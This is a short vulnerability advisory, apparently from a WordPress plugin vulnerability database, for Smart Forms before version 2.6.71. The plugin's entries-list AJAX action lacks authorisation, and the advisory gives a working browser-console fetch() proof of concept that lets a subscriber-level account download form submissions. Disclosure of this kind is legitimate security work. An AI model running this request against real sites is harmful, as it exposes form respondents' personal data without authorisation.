## WordPress Plugin Vulnerabilities

# Smart Forms < 2.6.71 - Subscriber+ Form Data Download

### Description

The plugin does not have authorisation in its rednao\_smart\_forms\_entries\_list AJAX action, allowing any authenticated users, such as subscriber, to download arbitrary form's data, which could include sensitive information such as PII depending on the form.

### Proof of Concept

Execute the below command in the web developer console of the browser when being logged in as a subscriber:
fetch("https://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": new URLSearchParams({"action":"rednao\_smart\_forms\_entries\_list","data":'{"Form":"1"}'}),
"method": "POST",
"credentials": "include"
})
.then(response => response.text())
.then(data => console.log(data));
